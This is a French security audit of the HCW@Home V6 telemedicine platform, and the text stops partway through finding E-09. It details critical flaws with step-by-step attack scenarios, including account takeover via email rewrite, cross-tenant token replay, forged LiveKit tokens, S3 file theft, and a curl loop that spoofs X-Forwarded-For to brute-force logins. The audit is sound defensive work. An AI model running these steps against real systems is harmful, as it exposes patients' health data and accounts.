# Audit de sécurité — HCW@Home V6

| | |
|---|---|
| **Date** | 18 septembre 2026 |
| **Version auditée** | commit `036edc66` (branche `master`, 7 septembre 2026), plus les modifications non commitées présentes dans l'arbre de travail au moment de l'audit (fournisseur de géocodage configurable, chiffrement au repos des pièces jointes en cours d'écriture dans `core/blobcrypto.py` et `core/storage.py`) |
| **Périmètre** | backend Django/DRF (`backend/`), frontend praticien Angular (`practitioner/`), frontend patient Ionic/Capacitor (`patient/`), configuration de déploiement (Docker Compose, Dockerfiles, nginx, paquet Debian, CI), dépendances |
| **Méthode** | revue de code statique en boîte blanche. Onze revues thématiques parallèles (authentification, autorisation, WebSockets et multi-tenant, fichiers et visio, messagerie et tâches, chiffrement E2E, FHIR et DAV, frontend praticien, frontend patient, infrastructure et dépendances, administration et vie privée), puis recoupement manuel de chaque constat critique et élevé dans le code. `pip-audit` et `yarn audit` exécutés hors dépôt. |
| **Ce qui n'a pas été fait** | aucun test dynamique, aucune instance démarrée, aucune requête réelle, aucun fichier du dépôt modifié. Les numéros de ligne sont ceux du commit audité ; l'arbre de travail évoluant pendant l'audit (`users/views.py`, `core/settings.py`, `core/urls.py`, `consultations/pdf_export.py`, `consultations/admin.py`), un décalage de quelques lignes est possible. |

Échelle de sévérité utilisée :

| Sévérité | Définition |
|---|---|
| **Critique** | exploitable à distance par un utilisateur peu privilégié (ou sans compte) avec compromission de comptes, de données de santé de tiers ou de l'instance entière |
| **Élevée** | compromission de données ou de comptes avec une précondition réaliste (compte praticien, staff, configuration par défaut, accès aux journaux) ou défaut de conception majeur |
| **Moyenne** | fuite limitée, contournement d'une politique, défense en profondeur absente, risque de conformité |
| **Faible** | impact réduit ou précondition forte |
| **Info** | observation, dette technique, écart documentation/code |

---

## 1. Synthèse

HCW@Home V6 repose sur une base sérieuse : jetons JWT liés au tenant par défaut, groupes Channels préfixés par schéma, codes OTP générés avec `secrets` et brûlés après trois échecs, throttles déclarés sur tous les endpoints d'authentification, échappement Angular systématique, primitives cryptographiques correctes (RSA-OAEP-SHA256, AES-256-GCM, PBKDF2 600 000 itérations), secrets lus depuis l'environnement, conteneur applicatif non root, dépendances récentes sans vulnérabilité connue.

Malgré cela, **l'application n'est pas déployable en production avec des données de santé sans corriger les constats P0**. Plusieurs failles permettent à un simple praticien authentifié de prendre le contrôle de comptes superuser, de lire les données d'autres tenants ou d'usurper l'identité d'un patient ; un déploiement Docker Compose « tel quel » laisse un serveur LiveKit avec des clés publiques et un superuser `admin`/`admin` ; tout compte staff peut devenir superuser via l'import CSV de l'admin ou exécuter du code sur le worker via les templates de notification.

### Répartition des constats

| Sévérité | Nombre |
|---|---|
| Critique | 5 |
| Élevée | 27 |
| Moyenne | 37 |
| Faible | 22 |
| Info | 12 |

### Les dix corrections à faire en premier (P0)

| # | Constat | Effort estimé |
|---|---|---|
| C-01 | Sept vues utilisent `JWTAuthentication` brut : un JWT d'un tenant est accepté sur un autre tenant | 1 h |
| C-02 | `PractitionerViewSet` / `PatientViewSet` / FHIR sans garde : réécriture de l'email d'un superuser puis reset de mot de passe ; `DELETE /api/users/<id>/` supprime physiquement n'importe quel compte | 1 jour |
| C-03 | LiveKit lancé en `--dev` avec les clés `devkey`/`secret`, port 7880 publié | 2 h |
| C-04 | Import CSV d'utilisateurs ouvert à tout staff (création d'un superuser), export complet avec hashes, OTP et tokens | 2 h |
| C-05 | Docker Compose : `SECRET_KEY=changeme`, superuser `admin@example.com`/`admin`, `ALLOWED_HOSTS=*` sans garde-fou | 2 h |
| E-01 | Rate limiting contournable par `X-Forwarded-For` (et verrouillage collectif derrière les nginx frontends) | 0,5 jour |
| E-02 | Prise de contrôle de compte via OpenID Connect (email non vérifié + auto-rattachement + promotion praticien) | 0,5 jour |
| E-11 | Templates de notification rendus par Jinja2 non sandboxé : exécution de code par tout staff éditeur de templates | 0,5 jour |
| E-07 | `recording_url` modifiable puis `download_recording` lit n'importe quel objet S3 (inter-tenant) | 2 h |
| E-03 | JWT de 60 h non révocables, logout inopérant, changement de mot de passe sans ancien mot de passe | 1 jour |

---

## 2. Architecture et surface d'attaque

- **Backend** : Django 6.0.8, DRF 3.18, django-tenants (un schéma PostgreSQL par tenant résolu par l'en-tête `Host`), Daphne + Channels (WebSockets `/ws/user/`, `/ws/consultation/<id>/`, `/ws/appointment/<id>/transcription/`), Celery + Redis, dj-rest-auth + simplejwt (JWT), allauth (OpenID Connect), `rest_framework.authtoken` (tokens statiques pour l'intégration FHIR), serveur FHIR R4 (`/api/fhir/*` et alias natifs `/api/patients/`, `/api/practitioners/`, `/api/appointments/`, `/api/consultations/`), CalDAV/CardDAV (`/dav/*`, auth Basic par mots de passe d'application), admin Django Unfold (`/<lang>/admin/`, sélecteur de connexion sur `/`), redirecteur de liens (`/r/<token>`), webhook Twilio.
- **Rôles** : superuser, staff, praticien (`is_practitioner`), patient, utilisateur temporaire (invité par lien), compte d'intégration (token statique).
- **Frontend praticien** : Angular 20, PWA avec service worker, JWT en `localStorage`, proxy nginx `/api` et `/ws` vers Daphne.
- **Frontend patient** : Ionic 8 / Angular 20 / Capacitor 7 (web + Android + iOS), login par code email/SMS ou lien magique, sélecteur d'instance avec signature Ed25519 « Iabsis », deep links `hcw://`.
- **Services tiers** : LiveKit (visio, enregistrement vers S3), MediaSoup (optionnel), whisper-live (transcription), Twilio SMS/WhatsApp, OVH, Swisscom, Clickatell, SMSMode, SMTP, Web Push (VAPID), FCM, Nominatim (géocodage), S3/MinIO.

---

## 3. Constats critiques

### C-01 — Isolation multi-tenant contournée : sept vues acceptent le JWT d'un autre tenant

- **Sévérité** : Critique
- **Localisation** : `backend/users/views.py:72` (import de `rest_framework_simplejwt.authentication.JWTAuthentication`) et `authentication_classes = [JWTAuthentication]` lignes 563 (`UserConsultationsViewSet`), 734 (`MessageAttachmentView`), 977 et 990 (Web Push subscribe/unsubscribe), 1012 (`UserAppointmentsViewSet`), 2025 (`TestRTCView`), 2071 (`UserDashboardView`). Contrôle correct de référence : `backend/core/authentication.py:24-69` (`TenantJWTAuthentication`, classe par défaut dans `REST_FRAMEWORK`).
- **Description** : `SIMPLE_JWT` ne définit pas de `SIGNING_KEY`, donc tous les tenants d'une instance signent avec le même `SECRET_KEY`. `TenantMainMiddleware` lie la connexion au schéma du `Host`. La classe brute de simplejwt vérifie la signature et l'expiration puis charge `User.objects.get(id=token["user_id"])` dans le schéma courant, sans jamais lire le claim `tenant_id`. Les identifiants étant des séquences par schéma, `user_id=5` existe dans presque tous les tenants.
- **Scénario** : un patient du tenant A (ou un invité temporaire, ou un compte auto-inscrit) envoie son propre JWT sur `https://tenant-b/api/user/consultations/`, `/api/user/appointments/`, `/api/messages/<id>/attachment/`, `/api/user/dashboard/`. Il est authentifié comme l'utilisateur de même id du tenant B et lit ses consultations, messages, pièces jointes, rendez-vous ; il peut poster des messages en son nom et obtenir un jeton LiveKit via `TestRTCView`.
- **Impact** : rupture complète de l'isolation entre établissements sur ces endpoints (données de santé).
- **Recommandation** : supprimer ces sept surcharges pour hériter de la classe par défaut, ou écrire `authentication_classes = [TenantJWTAuthentication]` ; ajouter un test qui rejoue un token de A sur B ; interdire l'import direct de `JWTAuthentication` par une règle de lint.

### C-02 — Prise de contrôle de comptes (superuser inclus) et suppression de comptes par tout praticien

- **Sévérité** : Critique
- **Localisation** :
  - `backend/users/views.py:2384-2395` : `PractitionerViewSet` (queryset = tous les praticiens actifs, staff et superusers compris ; `UserDetailsSerializer` ; méthodes `put`, `patch`, `delete` ouvertes ; aucune surcharge de `update`/`destroy`).
  - `backend/users/views.py:2319-2334` : `PatientViewSet` (tous les patients actifs, `patient_visibility` ignoré).
  - `backend/users/views.py:1219` : `UserViewSet` avec des gardes sur `update`/`partial_update` (l. 1393-1439) mais **aucune sur `destroy`** : suppression physique par `ModelViewSet.destroy`.
  - `backend/users/serializers.py` : `UserDetailsSerializer` laisse `email`, `mobile_phone_number`, `communication_method`, `last_login`, `temporary` modifiables.
  - `backend/users/fhir.py:80-89` (`_apply_telecom` écrase `email`), `:253-257` (création d'un `User(is_practitioner=True)` par `POST /api/fhir/Practitioner`), `:295-324` (`_resolve_upsert_target` fait `User.objects.get(pk=…)` sans périmètre), `:346-348` (`soft_delete` = `is_active=False`).
  - `backend/consultations/models.py:124, 250, 494, 693, 739, 777, 935` : `created_by` en `on_delete=CASCADE`.
- **Description** : les gardes anti-escalade n'existent que sur `/api/users/<id>/` (et pas pour DELETE). Les routes parallèles `/api/practitioners/<id>/`, `/api/patients/<id>/`, `/api/fhir/Practitioner/<id>`, `/api/fhir/Patient/<id>` servent le même modèle sans aucune garde. Cela contredit la politique documentée « Practitioners are NEVER created via FHIR » (`consultations/fhir_participants.py:9-11`).
- **Scénario** :
  1. `PATCH /api/practitioners/<id_superuser>/ {"email": "attaquant@evil.tld"}` (ou `PUT /api/fhir/Practitioner/<id>` avec un `telecom` email).
  2. `POST /api/auth/password/reset/ {"email": "attaquant@evil.tld"}`, réception du lien, définition d'un mot de passe, connexion à `/admin/` en superuser.
  3. Variante SSO : avec `SOCIALACCOUNT_EMAIL_AUTHENTICATION` + `AUTO_CONNECT` (E-02), une identité OIDC portant cet email est rattachée au compte victime.
  4. Variante destructrice : `DELETE /api/users/<id_superuser>/` supprime physiquement le compte et, par cascade, toutes les consultations, rendez-vous, messages et rappels qu'il a créés ; `DELETE /api/practitioners/<id>/` ou `{"active": false}` désactive tous les collègues et administrateurs.
  5. Côté patient : `PATCH /api/patients/<id>/ {"email": "attaquant@…"}` puis `/api/auth/send-verification-code/` et `/api/auth/verify/` : l'attaquant reçoit le code et obtient une session patient complète.
- **Impact** : escalade praticien vers superuser, compromission de tout compte patient, destruction massive de données de santé, déni de service sur les comptes.
- **Recommandation** : appliquer aux trois ViewSets et aux routes FHIR les gardes de `UserViewSet.update` (refus si cible staff, superuser, autre praticien, membre de groupe) ; interdire toute suppression physique d'un utilisateur par l'API (`http_method_names` sans `delete`, ou soft delete uniquement) ; rendre `email` et `mobile_phone_number` non modifiables par un tiers, ou exiger une vérification par code du nouvel identifiant avant qu'un reset soit possible ; refuser `POST /api/fhir/Practitioner` ; faire passer `_resolve_upsert_target` par `self.get_queryset()` ; appliquer `patient_visibility` et `users_visibility` dans `PatientViewSet`/`PractitionerViewSet` ; ajouter des tests de non-régression.

### C-03 — Serveur LiveKit lancé en mode `--dev` avec les clés publiques `devkey`/`secret`

- **Sévérité** : Critique
- **Localisation** : `docker-compose.yml:298` (`command: --dev --bind 0.0.0.0`), `:301` (volume `./livekit/livekit.yaml`), `:308` (`7880:7880`), `:146-148` (service `provision` : `LIVEKIT_API_KEY:-devkey`, `LIVEKIT_API_SECRET:-secret`) ; `backend/tenants/management/commands/bootstrap_tenant.py:128-134` ; `livekit/livekit.yaml` est un **dossier vide** non versionné (`git ls-files livekit` ne renvoie rien).
- **Description** : le fichier de configuration référencé n'existe pas dans le dépôt, `--config` n'est pas passé (contrairement au commentaire du compose), et `--dev` fait démarrer LiveKit avec la paire documentée publiquement `devkey:secret`. Le provisioning enregistre ces mêmes clés en base pour chaque tenant. Ni `docs/deployment/docker-compose.md` ni `environment-variables.md` ne mentionnent `LIVEKIT_API_KEY`/`LIVEKIT_API_SECRET`.
- **Scénario** : quiconque atteint le port 7880 (nécessairement public puisque les navigateurs s'y connectent) forge un JWT HS256 signé avec `secret` portant `roomList`, `roomJoin`, `hidden`, `roomAdmin`, `roomRecord` : il liste toutes les rooms (UUID des consultations en cours), rejoint n'importe quelle téléconsultation en participant caché, s'abonne à l'audio et à la vidéo, coupe ou expulse les participants, lance un egress vers un S3 qu'il contrôle.
- **Impact** : interception silencieuse de toutes les téléconsultations de tous les tenants d'une instance déployée avec le compose fourni.
- **Recommandation** : commiter un vrai `livekit/livekit.yaml` (fichier) avec `keys:` injectées depuis l'environnement, lancer `--config /etc/livekit.yaml` sans `--dev`, faire échouer `bootstrap_tenant` si la clé vaut `devkey`, documenter la génération des clés, épingler l'image (`livekit-server:latest` aujourd'hui).

### C-04 — Import CSV d'utilisateurs ouvert à tout compte staff (création d'un superuser) et export complet de la table `User`

- **Sévérité** : Critique
- **Localisation** : `backend/users/admin.py:179` (`UserAdmin(BaseUserAdmin, ModelAdmin, ImportExportModelAdmin)` sans `resource_class` restrictive) ; `backend/messaging/admin.py:292` (`TemplateAdmin`, idem) ; `backend/core/settings.py` : aucune clé `IMPORT_EXPORT_IMPORT_PERMISSION_CODE` / `IMPORT_EXPORT_EXPORT_PERMISSION_CODE` ; `import_export/admin.py:124-128, 641-645` (django-import-export 4.4.1 : sans ces réglages, `has_import_permission` et `has_export_permission` renvoient `True`).
- **Description** : les vues `/admin/users/user/import/` et `/export/` ne sont protégées que par `admin_view` (`is_active and is_staff`), pas par `users.add_user`/`change_user`/`view_user`. Le `ModelResource` par défaut couvre tous les champs concrets : `password` (hash), `is_superuser`, `is_staff`, `is_active`, `one_time_auth_token`, `verification_code`, `encrypted_private_key`, `public_key`, identité, contact, date de naissance.
- **Scénario** : un compte staff sans aucune permission modèle (support, stagiaire, compte compromis) importe un CSV `email,password,is_staff,is_superuser` avec un hash PBKDF2 qu'il a généré, puis se connecte en superuser. Symétriquement, il exporte toute la table en XLSX : hashes, codes OTP en cours, `one_time_auth_token` valides (connexion immédiate en tant que patient, voir M-10), clés privées chiffrées, données personnelles de tous les patients.
- **Impact** : prise de contrôle totale de la plateforme et exfiltration de l'annuaire patients et praticiens par n'importe quel staff.
- **Recommandation** : `IMPORT_EXPORT_IMPORT_PERMISSION_CODE = "add"` et `IMPORT_EXPORT_EXPORT_PERMISSION_CODE = "view"` ; `UserResource` explicite avec liste blanche de champs (exclure `password`, `is_superuser`, `is_staff`, tokens, codes, clés), `import_id_fields = ["email"]` ; réserver l'import aux superusers ; `IMPORT_EXPORT_ESCAPE_FORMULAE_ON_EXPORT = True` (voir M-30) ; même traitement pour `TemplateAdmin`.

### C-05 — Docker Compose : secrets et superuser par défaut, sans garde-fou au démarrage

- **Sévérité** : Critique
- **Localisation** : `docker-compose.yml:24` (`DJANGOSECRET_KEY:-changeme`), `:29` (`ALLOWED_HOSTS:-*`), `:31` (`CSRF_TRUSTED_ORIGINS` en `http://`), `:41` et `:286` (`DATABASE_PASSWORD:-hcw`), `:138-139` (`SUPERUSER_EMAIL:-admin@example.com`, `SUPERUSER_PASSWORD:-admin`), `:194` (admin publié sur `8082`) ; `backend/tenants/management/commands/bootstrap_tenant.py:273-277` (création effective du superuser) ; `backend/core/settings.py:44` (`SECRET_KEY = os.getenv(...)` sans détection de valeur factice) ; aucun `manage.py check --deploy` dans le dépôt.
- **Description** : `docker compose up` sans `.env` provisionne un superuser `admin@example.com`/`admin` sur une interface d'administration exposée, avec une `SECRET_KEY` connue qui signe sessions, JWT et liens de réinitialisation. Les avertissements sont de simples commentaires ; la documentation invite à télécharger ce compose tel quel.
- **Scénario** : connexion directe en superuser sur `:8082` ; ou forge de JWT et de sessions avec la clé `changeme` (usurpation de n'importe quel compte via `/api/`).
- **Impact** : prise de contrôle totale de l'instance et des données de santé.
- **Recommandation** : aucune valeur par défaut pour `DJANGOSECRET_KEY`, `SUPERUSER_PASSWORD`, `DATABASE_PASSWORD` (syntaxe `${VAR:?message}`) ; check système Django (`Tags.security`) refusant `changeme` et la clé de `.env-dist` ; mot de passe initial aléatoire affiché une fois ou lien de réinitialisation ; `check --deploy` dans l'entrypoint quand `DEBUG=False` ; retirer le défaut `*` de `ALLOWED_HOSTS`.

---

## 4. Constats de sévérité élevée

### E-01 — Rate limiting contournable par `X-Forwarded-For`, verrouillage collectif derrière les proxies frontends

- **Localisation** : `backend/core/throttling.py:25-30` (`get_client_ip` prend le premier élément de `X-Forwarded-For`), `:70-73` (`IdentifierRateThrottle` inclut cette IP dans sa clé), `:181` (décorateur `ratelimit`) ; `backend/nginx:36` (`$proxy_add_x_forwarded_for` ajoute l'IP réelle **après** la valeur fournie par le client) ; `practitioner/nginx:28-35`, `patient/nginx:28-35`, `debian/nginx:34-41, 71-78` (aucun `X-Forwarded-For` posé : l'en-tête du client est transmis tel quel et `REMOTE_ADDR` vaut l'IP du proxy pour tout le monde) ; Daphne lancé sans `--proxy-headers`.
- **Description** : chaque requête portant une valeur `X-Forwarded-For` différente tombe dans un seau neuf. Toutes les limites de `settings.py` (`login` 5/min, `password_reset`, `verification_code`, `anonymous_token`, `openid`, `registration`, `registration_day`, `email_verify`), le login du sélecteur admin (`core/views.py:18-20`) et DAV sont inopérants. La limite « par identifiant » est également contournée puisque sa clé contient l'IP. À l'inverse, derrière les nginx frontends et Debian, tous les utilisateurs partagent le même seau : cinq échecs de connexion par minute, par n'importe qui, bloquent la connexion de toute l'instance.
- **Scénario** : `for i in $(seq 1 100000); do curl -H "X-Forwarded-For: 10.$((i/65536)).$((i/256%256)).$((i%256))" -d '{"email":"…","password":"…"}' https://…/api/auth/login/; done`.
- **Impact** : force brute des mots de passe (API et admin), bombardement de codes et de SMS facturés, déni de service de la connexion pour les utilisateurs légitimes.
- **Recommandation** : n'honorer `X-Forwarded-For` que derrière une liste de proxies de confiance (module `real_ip` de nginx avec `set_real_ip_from`, ou `proxy_set_header X-Forwarded-For $remote_addr` en écrasant, puis lire `REMOTE_ADDR` côté Django ; ou prendre l'élément le plus à droite non trusté) ; retirer l'IP de la clé d'`IdentifierRateThrottle` ; ajouter un verrouillage progressif par compte (`django-axes` ou compteur en cache) ; tests.

### E-02 — Prise de contrôle de compte et escalade via OpenID Connect

- **Localisation** : `backend/core/settings.py:432-441` (`SOCIALACCOUNT_EMAIL_AUTHENTICATION = True`, `SOCIALACCOUNT_EMAIL_AUTHENTICATION_AUTO_CONNECT = True`, `SOCIALACCOUNT_AUTO_SIGNUP = True`, `SOCIALACCOUNT_LOGIN_ON_GET = True`, provider `openid_connect` avec `VERIFIED_EMAIL: True`) ; `backend/users/views.py:1543-1548` (`OpenIDView` : `is_practitioner = True` pour tout login OIDC réussi) ; `:1460-1507, 1530-1554` (`_pkce_code_verifier` et `_id_token` sont des attributs de **classe** partagés entre requêtes).
- **Description** : `VERIFIED_EMAIL: True` force allauth à considérer l'email de l'IdP comme vérifié quelle que soit la claim `email_verified` ; l'auto-connexion rattache l'identité sociale au compte local portant cet email (table `EmailAddress` ou `User.email`) sans exiger de vérification locale, et efface le mot de passe local. dj-rest-auth émet ensuite un JWT pour ce compte et `OpenIDView` le promeut praticien.
- **Scénario** : l'attaquant crée une identité chez l'IdP configuré (IdP à inscription libre, Keycloak avec self-registration sans vérification, IdP mutualisé) avec l'email d'un superuser ou d'un patient. Un login OIDC suffit pour recevoir un JWT du compte victime, rendre son mot de passe inutilisable et, pour un patient, devenir praticien. Sans même viser une victime, tout utilisateur de l'IdP devient praticien du tenant. Sous concurrence, l'`id_token` d'un utilisateur peut être renvoyé à un autre (attributs de classe).
- **Impact** : compromission totale d'un tenant ou d'un dossier patient ; dépend de la politique d'inscription de l'IdP (à confirmer en production).
- **Recommandation** : `VERIFIED_EMAIL: False` (respecter `email_verified`) et liste de domaines de confiance ; `AUTO_CONNECT = False` ou n'auto-connecter que si l'`EmailAddress` locale est vérifiée ; `SOCIALACCOUNT_LOGIN_ON_GET = False` ; conditionner `is_practitioner=True` à une claim ou un groupe de l'IdP et ne jamais l'appliquer à un compte existant non praticien ; attributs d'instance pour PKCE/`id_token` ; valider `state`/`nonce` côté serveur.

### E-03 — Jetons JWT de 60 heures, non révocables, logout inopérant, changement de mot de passe sans ancien mot de passe

- **Localisation** : `backend/core/settings.py:218-224` (`ACCESS_TOKEN_LIFETIME` en **minutes**, défaut `3600` = 60 h, documenté ainsi dans `docs/deployment/environment-variables.md:82` mais présenté comme `60` dans `.env-dist:99` ; refresh 1 jour, donc plus court que l'access ; `ROTATE_REFRESH_TOKENS: True` sans `BLACKLIST_AFTER_ROTATION`) ; `rest_framework_simplejwt.token_blacklist` absent de `INSTALLED_APPS` ; `backend/api/urls.py:27, 29, 32` (`LogoutView`, `PasswordChangeView`, `TokenRefreshView` brut) ; `REST_AUTH` sans `OLD_PASSWORD_FIELD_ENABLED` ni `LOGOUT_ON_PASSWORD_CHANGE` (défauts `False`), `JWT_AUTH_HTTPONLY: False`, pas de `JWT_AUTH_SECURE` ; `practitioner/src/app/core/services/auth.ts:33-59` (access, refresh et `id_token` OIDC en `localStorage`) ; `patient/src/app/core/services/auth.service.ts:187-205` (le client envoie le refresh à `/auth/logout/`, mais dj-rest-auth ne blackliste rien sans l'app `token_blacklist`).
- **Description** : un access token volé reste valable deux jours et demi ; la déconnexion est purement côté client ; un refresh token « tourné » reste valide jusqu'à expiration, et en rafraîchissant une fois par jour une session ne périme jamais ; aucun événement (logout, reset ou changement de mot de passe, changement d'email, réclamation d'un compte) ne révoque quoi que ce soit, seul `is_active=False` coupe l'accès. `POST /api/auth/password/change/` accepte un nouveau mot de passe sans l'ancien : un vol de session vaut prise de contrôle durable. Les cookies `_auth`/`_refresh` posés au login sont lisibles en JavaScript et sans `Secure`.
- **Scénario** : XSS, extension malveillante, poste partagé ou lecture des journaux (E-04) : l'attaquant rejoue l'API pendant 60 h, fixe un mot de passe, appelle `forgot-passphrase` (M-17) et conserve un accès permanent.
- **Impact** : persistance d'accès aux dossiers patients, impossibilité de couper un accès compromis autrement qu'en désactivant le compte.
- **Recommandation** : access ≤ 15-60 min, refresh > access ; installer `rest_framework_simplejwt.token_blacklist`, `BLACKLIST_AFTER_ROTATION: True`, utiliser `dj_rest_auth.jwt_auth.get_refresh_view()` et blacklister au logout, aux changements de mot de passe/email et à la réclamation d'un compte ; borner la durée absolue d'une session ; `OLD_PASSWORD_FIELD_ENABLED: True`, `LOGOUT_ON_PASSWORD_CHANGE: True` ; `JWT_AUTH_HTTPONLY: True` + `JWT_AUTH_SECURE: True` ou suppression des cookies JWT (les SPA utilisent l'en-tête `Authorization`) ; à terme, refresh en cookie `HttpOnly; Secure; SameSite=Strict` et access en mémoire.

### E-04 — Jeton JWT transmis dans la query string des WebSockets

- **Localisation** : `backend/core/channelsmiddleware.py:96-101` (`?token=`), `practitioner/src/app/core/services/user-websocket.service.ts:108`, `transcription.service.ts:98-99`, `mediasoup.service.ts:333-335`, `patient/src/app/core/services/user-websocket.service.ts:71`, `mediasoup.service.ts:335-336` ; aucun `access_log off` sur `/ws` dans `backend/nginx`, `practitioner/nginx`, `patient/nginx`, `debian/nginx`.
- **Description** : l'access token (60 h, non révocable) figure dans l'URL de handshake, donc dans les journaux d'accès nginx, des reverse proxies amont, des outils de supervision et du serveur MediaSoup. Le WebSocket, une fois accepté, n'est jamais ré-authentifié : il survit à l'expiration du jeton et au logout. `scope["cors_allowed"]` est calculé mais jamais lu : aucune validation de l'en-tête `Origin` (atténué : auth par jeton et non par cookie).
- **Recommandation** : authentifier après ouverture (premier message `{"type":"auth","token":…}`) ou via `Sec-WebSocket-Protocol`, ou ticket WS à usage unique et court ; masquer `token=` dans le `log_format` ; fermer les sockets d'un utilisateur au logout et re-valider l'expiration ; valider l'`Origin` (`AllowedHostsOriginValidator`) ou retirer le code mort.

### E-05 — Force brute : aucun verrouillage par compte, login admin natif non throttlé, pas de MFA, vues allauth et `django.contrib.auth` exposées

- **Localisation** : `backend/users/serializers.py:433-455` (`LoginSerializer` sans compteur) ; `backend/core/urls.py:55` (`/<lang>/admin/login/` natif, non throttlé ; seul `LoginSelectorView` sur `/` l'est) ; `core/urls.py:45` (`allauth.urls` → `/accounts/signup/`, `/accounts/login/`, `/accounts/password/reset/`) et `:48` (`django.contrib.auth.urls` → `/password_reset/`, `/reset/<uid>/<token>/`, `/password_change/`) ; pas d'`ACCOUNT_ADAPTER` (allauth `is_open_for_signup` renvoie `True`), `ACCOUNT_EMAIL_VERIFICATION = "none"` ; MFA commentée (`requirements.in:16`, `settings.py:1451-1453`) alors que `README.md:40, 90` et `docs/index.fr.md:27` la promettent ; `core/views.py:30-42` (`LoginSelectorView.post` ignore `config.disable_password_login`).
- **Description** : `/accounts/signup/` crée un compte actif avec mot de passe, sans vérification d'email, en ignorant `enable_registration`, `force_temporary_patients` et le flux par code ; `/password_reset/` envoie des emails de reset sans limite, y compris aux praticiens en mode SSO-only ; le formulaire admin natif n'a aucune limite (E-01 rend de toute façon les throttles inopérants) ; aucun second facteur pour les comptes staff.
- **Scénario** : dictionnaire sur `/en/admin/login/` contre les emails de staff (obtenables par énumération M-12 ou via `/api/practitioners/<id>/public/`) ; pré-enregistrement d'un email de future patiente via `/accounts/signup/` puis récupération du compte lorsqu'elle le réclame par code (`RegisterSerializer.save` renvoie le compte existant, `serializers.py:405-411`).
- **Recommandation** : verrouillage progressif par compte et IP ; throttle sur `admin:login` ou redirection vers `LoginSelectorView` ; retirer `allauth.urls` (ne garder que le provider OIDC si nécessaire) et `django.contrib.auth.urls` ; sinon `ACCOUNT_ADAPTER` avec `is_open_for_signup` lisant `enable_registration`, `ACCOUNT_EMAIL_VERIFICATION = "mandatory"`, `ACCOUNT_PREVENT_ENUMERATION = True` ; activer une MFA réelle (`allauth.mfa` TOTP/WebAuthn) au moins pour `is_staff`, ou retirer la mention de la documentation.

### E-06 — Un praticien usurpe l'identité de n'importe quel patient via le lien magique

- **Localisation** : `backend/users/views.py:2336-2378` (`PatientViewSet.access_url`, tous les patients quel que soit `patient_visibility`) ; `backend/users/models.py:322-333, 365-379` (`requires_manual_access`, `authenticates_without_code`) ; `backend/api/views.py:176-201` (`AnonymousTokenAuthView` : le jeton seul suffit pour ces comptes) ; `backend/users/serializers.py:106` (`communication_method` modifiable).
- **Scénario** : `PATCH /api/patients/<id>/ {"communication_method": "manual"}`, puis `POST /api/patients/<id>/access_url/`, puis `POST /api/auth/token/ {"auth_token": "<uuid>"}` : JWT du patient, lecture de toutes ses consultations (y compris celles d'autres praticiens), envoi de messages et acceptation de CGU en son nom.
- **Impact** : contournement total de `patient_visibility`, usurpation d'identité, non-répudiation compromise.
- **Recommandation** : appliquer le scoping de visibilité à `PatientViewSet` ; réserver `access_url` au créateur ou à l'équipe soignante ; interdire le passage en `manual` d'un compte disposant déjà d'un canal ; journaliser et notifier toute génération de lien.

### E-07 — IDOR sur les enregistrements et lecture arbitraire du bucket S3 via `recording_url`

- **Localisation** : `backend/consultations/serializers.py:1294-1317` (`ConsultationMessageSerializer` : `recording_url` dans `fields`, aucun `read_only_fields`) ; `backend/consultations/views.py:1867-1888` (`MessageViewSet.update`, PATCH partiel, seule condition : être l'auteur) ; `:1914-1959` (`download_recording` : `s3_client.get_object(Bucket=settings.LIVEKIT_S3_BUCKET_NAME, Key=message.recording_url)`) ; `core/settings.py:1658-1662` (`LIVEKIT_S3_*` = `S3_*` par défaut, donc le **même bucket** que les pièces jointes) ; `mediaserver/manager/livekit.py:405` (clé `recordings/appointment_<id>_<timestamp>.mp4`, sans préfixe tenant).
- **Scénario** : un patient poste un message puis `PATCH /api/messages/<id>/ {"recording_url": "<schema_autre_tenant>/messages_attachment/ordonnance.pdf"}` (les noms d'origine sont conservés, `core/storage.py`) ou `recordings/appointment_57_1758100000.mp4` (id séquentiel, horodatage devinable), puis `POST /api/messages/<id>/download_recording/` : le backend streame l'objet avec ses propres credentials. Le `recording_url` réel est de toute façon renvoyé à tous les lecteurs de la consultation.
- **Impact** : exfiltration des vidéos de téléconsultations et des pièces jointes de n'importe quel tenant dès que S3 est configuré. Le chiffrement au repos en cours d'écriture ne protège pas : `download_recording` lit S3 en direct avec boto3, hors du storage chiffré.
- **Recommandation** : `recording_url`, `is_encrypted`, `encrypted_attachment_metadata`, `deleted_at`, `is_edited` en `read_only_fields` ; ne servir que les enregistrements liés par `AppointmentRecording` (filtrée par tenant) ; clés S3 préfixées par le schéma et non devinables ; bucket ou credentials dédiés aux enregistrements.

### E-08 — Tout praticien peut régénérer la paire de clés E2E de n'importe quel utilisateur et recevoir sa passphrase

- **Localisation** : `backend/users/encryption_views.py:134-159` (`RegenerateUserKeyView` : contrôle `is_staff or is_practitioner`, `User.objects.get(pk=user_id)` sans lien avec la cible), `:162-194` (`_regenerate_keypair` renvoie la passphrase dans la réponse) ; `backend/users/urls.py:80-83`.
- **Scénario** : `POST /api/users/<id_superuser>/regenerate-encryption-key/` : la victime est verrouillée hors de ses consultations chiffrées (les `ConsultationKey` existantes ne sont jamais ré-enveloppées, voir M-18), toutes les nouvelles enveloppes sont chiffrées pour une clé dont l'attaquant connaît la passphrase. Ni throttle, ni journal, ni notification.
- **Impact** : déni de service ciblé sur des données de santé, et base d'une compromission des clés si l'attaquant obtient le blob (`encrypted_private_key` n'est servi qu'au propriétaire, mais un accès admin/export C-04 le livre). Actif seulement si `encryption_enabled`.
- **Recommandation** : réserver l'action aux superusers ou à l'utilisateur lui-même (ou au créateur pour ses patients `manual`), exiger une ré-authentification, journaliser, notifier la victime, throttler ; ne pas retourner la passphrase à un tiers.

### E-09 — Page admin « Encryption » accessible à tout compte staff : remplacement de la clé master, désactivation du chiffrement

- **Localisation** : `backend/encryption_admin/admin.py:32-71` (URLs `generate-master/`, `enable/`, `disable/`, `reprovision/`, `user-pubkey/<id>/` enveloppées seulement par `site.admin_view`, qui ne vérifie que `is_active and is_staff`), `:85-86` (`has_view_permission = is_superuser` ne protège que l'entrée de changelist) ; `backend/encryption_admin/views.py:50-98, 101-138, 176-197` (aucun contrôle de permission) ; `core/settings.py:872-896` (restriction superuser uniquement dans le **menu** Unfold) ; `consultations/admin.py:106-122, 255-281` (`public_key`, `encrypted_private_key_master`, enveloppes de queues visibles ou éditables dans l'admin).
